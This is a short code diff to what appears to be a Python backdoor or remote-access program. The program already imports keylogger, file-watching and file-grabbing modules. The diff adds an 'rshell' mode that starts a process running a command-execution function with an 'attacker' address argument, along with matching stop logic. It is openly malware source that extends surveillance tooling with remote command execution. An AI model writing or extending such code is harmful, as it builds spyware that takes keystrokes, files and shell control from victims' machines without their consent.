@@ -9,6 +9,7 @@ import keylog as keylogger
 import watchfile as watchfile
 import watchdir as watchdir
 import getfile as getfile
+import rshell as rshell
 
 
 # Parse command-line arguments
@@ -117,6 +118,15 @@ def exec_function(mode, *args):
             process_list.append(watchdir_process)
             process_list[0].start()
 
+        elif mode == "rshell":
+            print("Activate: ", mode)
+            is_running = True
+
+            command = args[0]
+            rshell_process = Process(target=rshell.exec_command, args=(command,parseargs.attacker,))
+            process_list.append(rshell_process)
+            process_list[0].start()
+
         else:
             return
 
@@ -147,6 +157,14 @@ def exec_function(mode, *args):
             process_list.pop(0)
 
         if mode == "watchdir":
+            print("Stop: ", mode)
+            is_running = False
+
+            # Terminate process and remove from processes list
+            process_list[0].terminate()
+            process_list.pop(0)
+
+        if mode == "rshell":
             print("Stop: ", mode)
             is_running = False
 
